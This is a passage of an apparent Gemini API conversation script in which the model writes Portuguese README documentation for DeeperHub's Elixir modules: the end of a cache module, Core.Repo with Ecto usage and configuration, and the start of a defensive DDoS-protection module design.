*   **Cache Poisoning:** Embora menos comum para caches de servidor, esteja ciente da possibilidade se as chaves de cache puderem ser influenciadas diretamente por entradas de usu√°rio n√£o sanitizadas. Use chaves bem definidas e prefixadas.
*   **Seguran√ßa do Backend de Cache:** Se usar Redis/Memcached, proteja o acesso a esses servidores (firewall, autentica√ß√£o).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Use chaves de cache consistentes e com namespaces para evitar colis√µes.
*   Defina TTLs apropriados para os dados cacheados. Dados que mudam raramente podem ter TTLs longos; dados vol√°teis, TTLs curtos ou invalida√ß√£o baseada em eventos.
*   Considere o tamanho dos dados armazenados em cache para n√£o esgotar a mem√≥ria (especialmente com ETS).

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar \"cache stampede protection\" (ou \"dog-piling effect\" prevention) para `get_or_store`, onde apenas um processo regenera um item de cache expirado enquanto outros esperam ou recebem o valor antigo por um curto per√≠odo.
*   [ ] Adicionar suporte para diferentes estrat√©gias de remo√ß√£o (eviction policies) no `EtsCache` (ex: LRU, LFU) se ele se tornar muito grande.
*   [ ] Desenvolver um `CacheWarmer` que possa pr√©-carregar dados importantes no cache durante a inicializa√ß√£o da aplica√ß√£o.
*   [ ] Suporte para cache em camadas (ex: ETS local como L1, Redis como L2).
*   [ ] Interface administrativa para visualizar o conte√∫do do cache, estat√≠sticas e invalidar entradas manualmente.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Caching √© fundamental para aplica√ß√µes de alta performance.

O pr√≥ximo m√≥dulo? Talvez `DeeperHub.Core.Repo` para fechar a parte de infraestrutura b√°sica, ou podemos voltar para algum m√≥dulo de seguran√ßa como `DDoSProtection`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos ent√£o ao `DeeperHub.Core.Repo`, o cora√ß√£o da persist√™ncia de dados no sistema.

---

# M√≥dulo: `DeeperHub.Core.Repo` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.Repo`

O m√≥dulo `DeeperHub.Core.Repo` √© a **implementa√ß√£o principal do Ecto.Repo** para o sistema DeeperHub. Ele serve como a interface de banco de dados para toda a aplica√ß√£o, gerenciando conex√µes, transa√ß√µes e a execu√ß√£o de consultas Ecto.

Atrav√©s deste m√≥dulo, todos os outros componentes do sistema interagem com o banco de dados (ou bancos de dados, se houver m√∫ltiplos reposit√≥rios configurados para diferentes prop√≥sitos) de forma consistente e segura. Ele encapsula a configura√ß√£o do adaptador de banco de dados (PostgreSQL, MySQL, etc.) e fornece as funcionalidades padr√£o do Ecto para CRUD (Create, Read, Update, Delete) e consultas complexas. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Interface Ecto.Repo Padr√£o:**
    *   Implementar o comportamento `Ecto.Repo`.
    *   Fornecer todas as fun√ß√µes padr√£o do Ecto: `insert/2`, `update/2`, `delete/2`, `get/3`, `get_by/3`, `all/2`, `one/2`, `transaction/2`, `preload/3`, etc.
*   **Gerenciamento de Conex√£o com Banco de Dados:**
    *   Configurar e gerenciar o pool de conex√µes com o(s) banco(s) de dados.
    *   Lidar com reconex√µes e falhas de conex√£o.
*   **Execu√ß√£o de Consultas Ecto:**
    *   Executar Ecto queries constru√≠das com `Ecto.Query`.
    *   Converter resultados do banco de dados em structs Ecto.
*   **Gerenciamento de Transa√ß√µes:**
    *   Fornecer a capacidade de executar m√∫ltiplas opera√ß√µes de banco de dados dentro de uma √∫nica transa√ß√£o at√¥mica (`transaction/2`).
    *   Garantir rollback em caso de erro dentro da transa√ß√£o.
*   **Suporte a Migra√ß√µes Ecto:**
    *   Ser o reposit√≥rio usado para executar migra√ß√µes de schema do banco de dados.
*   **Configura√ß√£o do Adaptador de Banco de Dados:**
    *   Carregar a configura√ß√£o do adaptador de banco de dados (PostgreSQL, MySQL, SQLite, etc.) a partir das configura√ß√µes da aplica√ß√£o.
*   **Observabilidade (via Ecto.LogEntry e Telemetria):**
    *   Ecto j√° emite eventos de telemetria para consultas (`[:my_app, :repo, :query]`). `DeeperHub.Core.Metrics` e `DeeperHub.Core.Logger` devem ter handlers para capturar esses eventos e registrar m√©tricas de DB (lat√™ncia, contagem de queries) e logs de queries (especialmente em dev ou para queries lentas).
*   **Suporte a M√∫ltiplos Reposit√≥rios (Opcional, se necess√°rio):**
    *   Se a aplica√ß√£o usar m√∫ltiplos bancos de dados para diferentes prop√≥sitos, pode haver m√∫ltiplos m√≥dulos Repo (ex: `Core.Repo.Primary`, `Core.Repo.Analytics`). Este README focar√° no principal.
*   **Integra√ß√£o com `QueryHelper` e `QueryOptimizer` (Opcional):**
    *   As fun√ß√µes de servi√ßo que usam o `Repo` podem utilizar os utilit√°rios `DeeperHub.Shared.Database.QueryHelper` para aplicar filtros, pagina√ß√£o e ordena√ß√£o de forma consistente, e `QueryOptimizer` para caching de queries.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.Repo` (M√≥dulo Ecto.Repo):**
    *   **Responsabilidade:** √â a pr√≥pria implementa√ß√£o do reposit√≥rio.
    *   **Configura√ß√£o:** `use Ecto.Repo, otp_app: :deeper_hub, adapter: Ecto.Adapters.Postgres` (ou outro adaptador).
    *   A configura√ß√£o detalhada (hostname, username, password, database, pool_size) √© geralmente carregada de `config/config.exs`, `config/runtime.exs` ou vari√°veis de ambiente.
2.  **Adaptador de Banco de Dados Ecto (ex: `Ecto.Adapters.Postgres`):**
    *   Biblioteca externa que lida com a comunica√ß√£o espec√≠fica do banco de dados.
3.  **Pool de Conex√µes (ex: `DBConnection` ou `Postgrex` pool):**
    *   Gerenciado pelo Ecto/adaptador para reutilizar conex√µes de banco de dados eficientemente.
4.  **Schemas Ecto (Definidos nos m√≥dulos de dom√≠nio):**
    *   Ex: `DeeperHub.Accounts.Schema.User`, `DeeperHub.Servers.Schema.Server`.
    *   S√£o usados pelo `Repo` para mapear dados de/para o banco de dados.
5.  **`DeeperHub.Release` (ou `lib/deeper_hub/application.ex`):**
    *   Respons√°vel por garantir que o `Repo` seja iniciado como parte da √°rvore de supervis√£o da aplica√ß√£o e que as migra√ß√µes sejam executadas durante o deploy.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/core/repo.ex          # Implementa√ß√£o do Ecto.Repo principal

priv/repo/
‚îú‚îÄ‚îÄ migrations/                     # Migra√ß√µes Ecto
‚îÇ   ‚îî‚îÄ‚îÄ 20230101000000_create_users.exs
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îî‚îÄ‚îÄ seeds.exs                       # (Opcional) Script para popular dados iniciais
```

### 3.3. Decis√µes de Design Importantes

*   **Reposit√≥rio √önico vs. M√∫ltiplos:** Para a maioria das aplica√ß√µes, um √∫nico `Repo` principal √© suficiente. M√∫ltiplos repos podem ser usados para conectar a diferentes bancos de dados ou para isolar contextos delimitados muito distintos, mas adicionam complexidade.
*   **Consultas Expl√≠citas:** As fun√ß√µes de servi√ßo devem construir e passar `Ecto.Query` expl√≠citas para o `Repo`, em vez de o `Repo` conter l√≥gica de consulta complexa.
*   **Transa√ß√µes para M√∫ltiplas Grava√ß√µes:** Qualquer opera√ß√£o que envolva m√∫ltiplas escritas no banco de dados que devem ser at√¥micas (ou seja, todas bem-sucedidas ou todas falham) deve ser encapsulada em uma `Repo.transaction/2`.
*   **Seguran√ßa:** Nunca construir fragmentos SQL por concatena√ß√£o de strings. Sempre usar consultas parametrizadas, que o Ecto faz por padr√£o quando usado corretamente.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Criar um Novo Usu√°rio:**
    *   `DeeperHub.Accounts.UserService` constr√≥i um changeset para um novo usu√°rio.
    *   Chama `DeeperHub.Core.Repo.insert(changeset)`.
*   **Buscar um Servidor pelo ID:**
    *   `DeeperHub.Servers.Storage` chama `DeeperHub.Core.Repo.get(DeeperHub.Servers.Schema.Server, server_id)`.
*   **Listar Todas as Avalia√ß√µes Ativas para um Servidor (com pagina√ß√£o e ordena√ß√£o):**
    *   `DeeperHub.ServerReviews.Storage` constr√≥i uma `Ecto.Query`:
        ```elixir
        from(r in Review,
          where: r.server_id == ^server_id and r.is_active == true,
          order_by: [desc: r.inserted_at],
          limit: ^limit,
          offset: ^offset
        ) |> DeeperHub.Core.Repo.all()
        ```
*   **Registrar um Usu√°rio e seu Perfil Atomicamente:**
    *   `DeeperHub.Accounts.RegistrationService` usa `DeeperHub.Core.Repo.transaction(fn -> ... end)` para garantir que tanto o usu√°rio quanto o perfil sejam criados, ou nenhum deles se ocorrer um erro.

## üåä 5. Fluxos Importantes

### Fluxo de uma Consulta `Repo.all/2`

1.  **M√≥dulo de Servi√ßo/Storage:** Constr√≥i uma `Ecto.Query.t()` (ex: `query = from(u in User, where: u.active == true)`).
2.  **Chamada ao Repo:** Chama `DeeperHub.Core.Repo.all(query)`.
3.  **`DeeperHub.Core.Repo`:**
    *   Obt√©m uma conex√£o do pool de conex√µes.
    *   O adaptador Ecto (ex: `Postgrex`) traduz a `Ecto.Query` para uma consulta SQL parametrizada.
    *   Envia a consulta SQL para o servidor de banco de dados.
4.  **Banco de Dados:** Executa a consulta e retorna os resultados.
5.  **`DeeperHub.Core.Repo`:**
    *   O adaptador Ecto recebe os resultados brutos.
    *   Converte os resultados em uma lista de structs Ecto (ex: `[%User{}, %User{}, ...]`).
    *   Libera a conex√£o de volta para o pool.
    *   Retorna a lista de structs para o chamador.
    *   Eventos Telemetry (`[:deeper_hub, :repo, :query]`) s√£o emitidos pelo Ecto.

### Fluxo de uma `Repo.transaction/2`

1.  **M√≥dulo de Servi√ßo:** Chama `DeeperHub.Core.Repo.transaction(fn repo_inside_transaction -> ... end)`.
2.  **`DeeperHub.Core.Repo`:**
    *   Obt√©m uma conex√£o do pool e a marca como estando em uma transa√ß√£o.
    *   Inicia uma transa√ß√£o no banco de dados (ex: `BEGIN`).
    *   Executa a fun√ß√£o an√¥nima passada, fornecendo uma inst√¢ncia do `Repo` que opera dentro dessa transa√ß√£o (`repo_inside_transaction`).
3.  **Fun√ß√£o An√¥nima:**
    *   Executa m√∫ltiplas opera√ß√µes de banco de dados usando `repo_inside_transaction` (ex: `repo_inside_transaction.insert(cs1)`, `repo_inside_transaction.update(cs2)`).
    *   Se todas as opera√ß√µes forem bem-sucedidas, a fun√ß√£o retorna `{:ok, result_value}`.
    *   Se qualquer opera√ß√£o falhar (ex: changeset inv√°lido, erro do DB), a fun√ß√£o pode retornar `{:error, reason}` ou o `Repo` pode levantar uma exce√ß√£o. √â comum usar `Repo.insert!/update!/delete!` dentro de transa√ß√µes para que um erro cause um rollback autom√°tico.
4.  **`DeeperHub.Core.Repo` (Conclus√£o da Transa√ß√£o):**
    *   Se a fun√ß√£o retornou `{:ok, result_value}`:
        *   Confirma a transa√ß√£o no banco de dados (ex: `COMMIT`).
        *   Retorna `{:ok, result_value}` para o chamador original.
    *   Se a fun√ß√£o retornou `{:error, reason}` ou levantou uma exce√ß√£o que o `Repo.transaction` captura:
        *   Cancela a transa√ß√£o no banco de dados (ex: `ROLLBACK`).
        *   Retorna `{:error, reason}` (ou propaga a exce√ß√£o, dependendo de como a transa√ß√£o foi configurada).
    *   Libera a conex√£o de volta para o pool.
    *   Eventos Telemetry s√£o emitidos para o in√≠cio, fim (commit/rollback) da transa√ß√£o.

## üì° 6. API (Fun√ß√µes Ecto.Repo Padr√£o)

O `DeeperHub.Core.Repo` exp√µe todas as fun√ß√µes padr√£o do `Ecto.Repo`. As mais comuns incluem:

*   `insert(changeset_or_struct, opts \\\\ [])`
*   `insert!(changeset_or_struct, opts \\\\ [])`
*   `update(changeset_or_struct, opts \\\\ [])`
*   `update!(changeset_or_struct, opts \\\\ [])`
*   `delete(struct, opts \\\\ [])`
*   `delete!(struct, opts \\\\ [])`
*   `get(schema_module, id, opts \\\\ [])`
*   `get!(schema_module, id, opts \\\\ [])`
*   `get_by(schema_module, clauses, opts \\\\ [])`
*   `get_by!(schema_module, clauses, opts \\\\ [])`
*   `all(queryable, opts \\\\ [])`
*   `one(queryable, opts \\\\ [])`
*   `one!(queryable, opts \\\\ [])`
*   `transaction(fun, opts \\\\ [])`
*   `preload(structs_or_struct, preloads, opts \\\\ [])`
*   `exists?(queryable)`
*   `aggregate(queryable, aggregate_op, field, opts \\\\ [])`

*Para a documenta√ß√£o completa de cada fun√ß√£o, consulte a documenta√ß√£o oficial do Ecto.*

## ‚öôÔ∏è 7. Configura√ß√£o

A configura√ß√£o do `DeeperHub.Core.Repo` √© feita principalmente atrav√©s dos arquivos de configura√ß√£o do Elixir (`config/config.exs`, `config/dev.exs`, `config/prod.exs`, `config/runtime.exs`) e vari√°veis de ambiente.

**Exemplo (`config/runtime.exs` para produ√ß√£o):**
```elixir
import Config

if config_env() == :prod do
  database_url =
    System.get_env(\"DATABASE_URL\") ||
      raise \"\"\"
      environment variable DATABASE_URL is missing.
      For example: ecto://USER:PASS@HOST/DATABASE
      \"\"\"

  config :deeper_hub, DeeperHub.Core.Repo,
    url: database_url,
    pool_size: String.to_integer(System.get_env(\"POOL_SIZE\") || \"10\"),
    ssl: String.to_atom(System.get_env(\"DATABASE_SSL\") || \"false\"), # ex: true, ou [certfile: \"path/to/cert.pem\"]
    # Outras op√ß√µes de produ√ß√£o, como timeouts
    socket_options: maybe_ipv6(System.get_env(\"DATABASE_SOCKET_OPTIONS\"))

  # Helper para socket_options
  defp maybe_ipv6(nil), do: []
  defp maybe_ipv6(\"ipv6\"), do: [:inet6]
  defp maybe_ipv6(_), do: []
end
```

**Configura√ß√µes Chave:**
*   `:otp_app`: `:deeper_hub` (indica que as configura√ß√µes do repo est√£o sob a app `:deeper_hub`).
*   `:adapter`: (ex: `Ecto.Adapters.Postgres`).
*   `:url` ou `:hostname`, `:username`, `:password`, `:database`: Credenciais de conex√£o.
*   `:pool_size`: N√∫mero de conex√µes no pool.
*   `:ssl`: Configura√ß√µes de SSL para a conex√£o.
*   Outras op√ß√µes espec√≠ficas do adaptador e do pool.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   Todos os m√≥dulos que definem `Ecto.Schema`.
*   Todos os m√≥dulos de servi√ßo/storage que executam opera√ß√µes de banco de dados.
*   `DeeperHub.Core.ConfigManager`: Para obter a string de conex√£o e outras configura√ß√µes do Repo em tempo de execu√ß√£o (se usando `Config.Provider`).

### 8.2. Bibliotecas Externas

*   `Ecto` (especificamente `ecto_sql` para bancos SQL).
*   O adaptador de banco de dados espec√≠fico (ex: `postgrex` para PostgreSQL, `myxql` para MySQL).
*   `DBConnection`: Para gerenciamento do pool de conex√µes.

## ü§ù 9. Como Usar / Integra√ß√£o

O `DeeperHub.Core.Repo` √© usado em toda a aplica√ß√£o onde a persist√™ncia de dados √© necess√°ria.

**Exemplo em um m√≥dulo de servi√ßo:**
```elixir
defmodule DeeperHub.Accounts.UserService do
  alias DeeperHub.Core.Repo
  alias DeeperHub.Accounts.Schema.User
  import Ecto.Query

  def get_user_by_id(user_id) do
    Repo.get(User, user_id) # Retorna %User{} ou nil
  end

  def create_user(attrs) do
    %User{}
    |> User.changeset(attrs)
    |> Repo.insert() # Retorna {:ok, %User{}} ou {:error, %Ecto.Changeset{}}
  end

  def list_active_users() do
    from(u in User, where: u.is_active == true)
    |> Repo.all()
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Os testes para o `Repo` em si s√£o geralmente cobertos pelos testes do Ecto.
*   Os testes dos m√≥dulos de servi√ßo/storage que *usam* o `Repo` devem verificar se os dados s√£o persistidos e recuperados corretamente.
*   Usar o `Ecto.Adapters.SQL.Sandbox` para testes de banco de dados √© a pr√°tica padr√£o para garantir isolamento e limpeza autom√°tica.
*   Localiza√ß√£o: Os testes que interagem com o Repo estar√£o nos diret√≥rios de teste dos m√≥dulos que o utilizam (ex: `test/deeper_hub/accounts/user_service_test.exs`).

### 10.2. M√©tricas

Ecto emite eventos Telemetry que podem ser usados para derivar m√©tricas (via `DeeperHub.Core.Metrics` com handlers apropriados):
*   `deeper_hub.core.repo.query.total.count` (tags: `source` (nome da tabela/schema), `action` (`select`, `insert`, `update`, `delete`))
*   `deeper_hub.core.repo.query.duration_ms` (Histograma, tags: `source`, `action`)
*   `deeper_hub.core.repo.query.idle_time_ms` (Histograma): Tempo que uma conex√£o ficou ociosa antes de ser usada.
*   `deeper_hub.core.repo.query.queue_time_ms` (Histograma): Tempo que uma query esperou por uma conex√£o dispon√≠vel.
*   `deeper_hub.core.repo.transaction.duration_ms` (Histograma)
*   `deeper_hub.core.repo.pool.size.gauge` (Gauge): Tamanho atual do pool.
*   `deeper_hub.core.repo.pool.checked_out.gauge` (Gauge): Conex√µes em uso.
*   `deeper_hub.core.repo.pool.overflow.count` (Contador): N√∫mero de vezes que o pool excedeu o tamanho.

### 10.3. Logs

*   Ecto pode ser configurado para logar todas as queries SQL executadas (`log_queries: true` na configura√ß√£o do Repo, geralmente apenas para desenvolvimento).
*   Queries lentas podem ser logadas com um n√≠vel mais alto (ex: WARNING) se um limiar for excedido.
*   Erros de conex√£o com o banco de dados.
*   Erros de transa√ß√£o (rollbacks).

### 10.4. Telemetria

Ecto emite eventos Telemetry padr√£o para opera√ß√µes de banco de dados. Os principais s√£o:
*   `[:your_app, :repo, :query]` (onde `:your_app` √© `:deeper_hub`):
    *   **Medi√ß√µes:** `:query_time`, `:decode_time`, `:queue_time`, `:idle_time`, `:total_time` (todos em `native` time units).
    *   **Metadados:** `:repo`, `:type` (`:ecto_sql | :ecto_mongodb | ...`), `:source` (nome da tabela/schema), `:action` (`:select | :insert | ...`), `:result` (`{:ok, term} | {:error, term}`), `:query` (a query Ecto), `:params`, `:stacktrace`.
*   Para transa√ß√µes, eventos como `[:your_app, :repo, :transaction]` s√£o emitidos.

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes do `Repo` como `insert`, `update`, `delete` retornam `{:ok, struct}` ou `{:error, changeset}`.
*   Fun√ß√µes \"bang\" (`insert!`, `update!`, `delete!`, `get!`, `one!`) levantam exce√ß√µes em caso de erro (ex: `Ecto.InvalidChangesetError`, `Ecto.NoResultsError`). Estas s√£o √∫teis dentro de transa√ß√µes para for√ßar um rollback.
*   Erros de conex√£o com o banco de dados podem levantar exce√ß√µes como `DBConnection.ConnectionError`. A aplica√ß√£o (ou o pool de conex√µes) geralmente tenta reconectar.
*   `Repo.transaction` retorna `{:ok, value}` se a fun√ß√£o interna retornar `{:ok, value}`, e `{:error, reason}` se a fun√ß√£o interna retornar `{:error, reason}` ou `Repo.rollback(reason)`.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Preven√ß√£o de Inje√ß√£o de SQL:** A principal responsabilidade de seguran√ßa do `Repo` √© facilitar o uso de consultas parametrizadas. **Nunca interpolar dados de entrada do usu√°rio diretamente em strings de consulta SQL.** Use `^` para interpolar vari√°veis em queries Ecto ou passe par√¢metros para `Ecto.Adapters.SQL.query/4`.
*   **Credenciais de Acesso:** As credenciais do banco de dados devem ser gerenciadas de forma segura (ex: vari√°veis de ambiente, cofres de segredos) e n√£o hardcoded.
*   **Permiss√µes do Usu√°rio do Banco de Dados:** O usu√°rio do banco de dados configurado para a aplica√ß√£o deve ter apenas as permiss√µes necess√°rias (princ√≠pio do menor privil√©gio).
*   **Dados Sens√≠veis:** Se o banco de dados armazenar dados sens√≠veis, considere criptografia em n√≠vel de coluna (usando tipos Ecto customizados como `DeeperHub.Shared.Encryption.EncryptedType`) ou criptografia em n√≠vel de banco de dados (TDE).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Mantenha a l√≥gica de consulta complexa fora do m√≥dulo `Repo`. Coloque-a em m√≥dulos de contexto/servi√ßo.
*   Sempre use changesets para validar dados antes de `insert` ou `update`.
*   Use transa√ß√µes para opera√ß√µes que envolvem m√∫ltiplas escritas at√¥micas.
*   Monitore a performance das queries e adicione √≠ndices no banco de dados conforme necess√°rio.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Configurar read replicas e um `Repo.ReadOnly` para desviar tr√°fego de leitura e aliviar o banco de dados prim√°rio, se a carga justificar.
*   [ ] Implementar estrat√©gias de retry mais sofisticadas para opera√ß√µes de banco de dados em caso de deadlocks ou falhas transit√≥rias.
*   [ ] Explorar o uso de `Ecto.Multi` para compor opera√ß√µes de banco de dados mais complexas de forma transacional.
*   [ ] Adicionar uma camada de \"data sharding\" se a aplica√ß√£o precisar escalar para volumes de dados muito grandes.
*   [ ] Melhorar a observabilidade com tracing distribu√≠do para queries Ecto, ligando-as a traces de requisi√ß√µes HTTP.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este README do `Core.Repo` foca em seu papel como interface Ecto e nas melhores pr√°ticas.

O que vem a seguir? J√° cobrimos bastante da camada de seguran√ßa e alguns componentes Core. Talvez `DeeperHub.Security.DdosProtection` ou um m√≥dulo de dom√≠nio como `DeeperHub.Servers`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos ent√£o para o `DeeperHub.Security.DdosProtection`, que j√° hav√≠amos esbo√ßado e agora podemos detalhar completamente.

---

# M√≥dulo: `DeeperHub.Security.DdosProtection` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.DdosProtection`

O m√≥dulo `DeeperHub.Security.DdosProtection` √© projetado para proteger o sistema DeeperHub contra ataques de **Nega√ß√£o de Servi√ßo Distribu√≠da (DDoS)** e ataques de Nega√ß√£o de Servi√ßo (DoS) mais simples. O objetivo desses ataques √© sobrecarregar os recursos do servidor (CPU, mem√≥ria, largura de banda, conex√µes de banco de dados) com um volume massivo de tr√°fego ileg√≠timo, tornando a aplica√ß√£o indispon√≠vel para usu√°rios leg√≠timos.

Este m√≥dulo implementa v√°rias estrat√©gias para mitigar esses ataques, incluindo:
1.  **Limita√ß√£o de Taxa (Rate Limiting) Agressiva:** Aplicar limites de taxa mais rigorosos baseados em IP e, potencialmente, em outros identificadores, para tr√°fego geral ou para endpoints espec√≠ficos durante um ataque percebido.
2.  **Bloqueio de IPs:** Identificar e bloquear IPs que participam de um ataque.
3.  **Detec√ß√£o de Padr√µes de Ataque:** Analisar padr√µes de tr√°fego para identificar caracter√≠sticas de ataques DDoS (ex: floods SYN, HTTP floods).
4.  **Modos de Prote√ß√£o Avan√ßada:** Capacidade de alternar para um modo de prote√ß√£o mais restritivo durante um ataque.
5.  **Integra√ß√£o com Servi√ßos Externos de Mitiga√ß√£o DDoS (Opcional):** Facilitar a integra√ß√£o com servi√ßos como Cloudflare, AWS Shield, etc.

O foco √© manter a disponibilidade do DeeperHub mesmo sob condi√ß√µes de tr√°fego anormais ou maliciosas. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Monitoramento de Tr√°fego em Tempo Real:**
    *   Analisar o volume, a origem e a natureza das requisi√ß√µes recebidas (`record_request/3`).
    *   Identificar picos anormais de tr√°fego ou padr√µes de requisi√ß√£o suspeitos indicativos de um ataque.
*   **Limita√ß√£o de Taxa Din√¢mica e Global:**
    *   Aplicar limites de taxa globais para IPs individuais para mitigar ataques de for√ßa bruta distribu√≠dos em pequena escala ou abuso.
    *   Permitir a configura√ß√£o de limites de taxa espec√≠ficos para endpoints cr√≠ticos ou frequentemente visados (`configure_rate_limit/3`).
    *   Utilizar `DeeperHub.API.RateLimiterFacade` como mecanismo subjacente, mas aplicar pol√≠ticas mais agressivas ou din√¢micas sob suspeita de DDoS.
*   **Detec√ß√£o e Bloqueio de IPs Atacantes:**
    *   Identificar endere√ßos IP que excedem significativamente os limites de taxa estabelecidos ou que participam de padr√µes de ataque conhecidos.
    *   Bloquear esses IPs tempor√°ria ou permanentemente, integrando-se com `DeeperHub.Security.IPFirewallService` (`block_ip/3`, `unblock_ip/1`).
*   **An√°lise de Padr√µes de Ataque (via `PatternAnalyzer`):**
    *   Implementar (ou integrar com ferramentas que implementam) detec√ß√£o para tipos comuns de ataques DDoS no n√≠vel da aplica√ß√£o (ex: HTTP GET/POST floods, ataques a formul√°rios de login/registro).
    *   Analisar User-Agents, referers, e outros cabe√ßalhos para identificar tr√°fego de bots.
*   **Modo de Prote√ß√£o Avan√ßada/Sob Ataque (`set_advanced_protection/2`):**
    *   Permitir a ativa√ß√£o manual ou autom√°tica de um modo de \"sob ataque\" que aplica regras mais estritas:
        *   Limites de taxa muito mais baixos para todos os IPs ou para IPs n√£o autenticados.
        *   Desafios de JavaScript ou CAPTCHA para novos visitantes ou tr√°fego suspeito.
        *   Bloqueio de faixas de IPs suspeitas, de ASNs conhecidos por originar ataques, ou de geografias espec√≠ficas.
        *   Poss√≠vel \"lista cinza\" de IPs que passam por verifica√ß√µes mais rigorosas.
*   **Relat√≥rios e Estat√≠sticas (`get_statistics/1`):**
    *   Fornecer estat√≠sticas sobre o volume de tr√°fego total, tr√°fego por IP/path, requisi√ß√µes bloqueadas/limitadas por taxa, e IPs atualmente bloqueados por pol√≠ticas de DDoS.
*   **Integra√ß√£o com Servi√ßos Externos de Mitiga√ß√£o DDoS (Opcional):**
    *   API para reportar IPs atacantes a servi√ßos como Cloudflare, Akamai, AWS Shield.
    *   API para receber e aplicar listas de bloqueio de IPs desses servi√ßos.
*   **Configurabilidade das Pol√≠ticas:**
    *   Pol√≠ticas de limita√ß√£o de taxa, limiares para detec√ß√£o de ataque, dura√ß√£o e escalonamento de bloqueios devem ser configur√°veis via `DeeperHub.Security.Policy.SecurityPolicyManager`.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.DdosProtection` (Fachada P√∫blica):**
    *   Ponto de entrada para funcionalidades de prote√ß√£o DDoS.
    *   Delega para `DdosProtectionService`.
2.  **`DeeperHub.Security.DdosProtection.Services.DdosProtectionService` (GenServer):**
    *   **Responsabilidade:** Processo central que monitora o tr√°fego, gerencia o estado de \"sob ataque\", aplica pol√≠ticas din√¢micas de rate limiting e coordena o bloqueio de IPs.
    *   **Estado Interno (pode usar ETS para contadores de alta performance):**
        *   Contadores de requisi√ß√µes agregados (global, por path, por IP em per√≠odos curtos).
        *   Estado atual do modo de prote√ß√£o (normal, avan√ßado/sob ataque).
        *   Limiares din√¢micos que podem ser ajustados.
    *   **Intera√ß√µes:**
        *   `DeeperHub.API.RateLimiterFacade` (ou um rate limiter interno espec√≠fico para DDoS): Para a mec√¢nica de contagem e limita√ß√£o.
        *   `DeeperHub.Security.IPFirewallService`: Para efetuar o bloqueio/desbloqueio de IPs.
        *   `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`: Para obter pol√≠ticas e limiares.
        *   `DeeperHub.Security.Monitoring`: Para registrar alertas de DDoS.
        *   `DeeperHub.Security.DdosProtection.PatternAnalyzer`: Para an√°lises mais profundas.
3.  **`DeeperHub.Security.Plugs.DdosProtectionPlug` (Phoenix Plug):**
    *   **Responsabilidade:** Interceptar requisi√ß√µes HTTP muito cedo no pipeline.
    *   Registra a requisi√ß√£o (`DdosProtectionService.record_request/3`).
    *   Verifica se a requisi√ß√£o deve ser bloqueada ou limitada por taxa com base nas pol√≠ticas de DDoS (`DdosProtectionService.check_request/3`).
    *   Deve ser posicionado ap√≥s o `IPFirewallPlug` (para IPs j√° conhecidos como maus) mas antes de plugs mais custosos.
4.  **`DeeperHub.Security.DdosProtection.PatternAnalyzer` (Worker GenServer ou M√≥dulo Funcional):**
    *   **Responsabilidade:** Analisar logs de tr√°fego ou um stream de eventos de requisi√ß√£o em background para identificar padr√µes de ataque mais sutis que a simples contagem de requisi√ß√µes por IP (ex: distribui√ß√£o an√¥mala de User-Agents, targeting de endpoints espec√≠ficos por m√∫ltiplos IPs de forma coordenada).
    *   Pode usar regras ou modelos simples de ML.
5.  **Adaptadores para Servi√ßos Externos de Mitiga√ß√£o (Opcional):**
    *   M√≥dulos espec√≠ficos para interagir com APIs de Cloudflare, AWS WAF/Shield, etc.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/ddos_protection/
‚îú‚îÄ‚îÄ ddos_protection.ex                # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ ddos_protection_service.ex    # GenServer principal com a l√≥gica de DDoS
‚îÇ
‚îú‚îÄ‚îÄ plug/                             # (Pode estar em deeper_hub_web/plugs)
‚îÇ   ‚îî‚îÄ‚îÄ ddos_protection_plug.ex
‚îÇ
‚îú‚îÄ‚îÄ pattern_analyzer.ex               # Worker/Servi√ßo para an√°lise de padr√µes
‚îÇ
‚îú‚îÄ‚îÄ external_mitigation/              # (Opcional) Adaptadores para servi√ßos de terceiros
‚îÇ   ‚îú‚îÄ‚îÄ cloudflare_adapter.ex
‚îÇ   ‚îî‚îÄ‚îÄ aws_shield_adapter.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Performance √© Chave:** O `DdosProtectionPlug` e as verifica√ß√µes iniciais no `DdosProtectionService` devem ser extremamente r√°pidos. Contadores em ETS s√£o essenciais.
*   **Defesa em Camadas:** A prote√ß√£o DDoS na aplica√ß√£o √© uma camada. Idealmente, h√° prote√ß√£o na borda da rede (firewalls, provedor de hospedagem, CDN).
*   **Falsos Positivos:** Bloquear tr√°fego leg√≠timo √© um grande risco. O \"modo de prote√ß√£o avan√ßada\" deve ser ativado com cautela, e mecanismos para liberar IPs leg√≠timos bloqueados erroneamente devem existir.
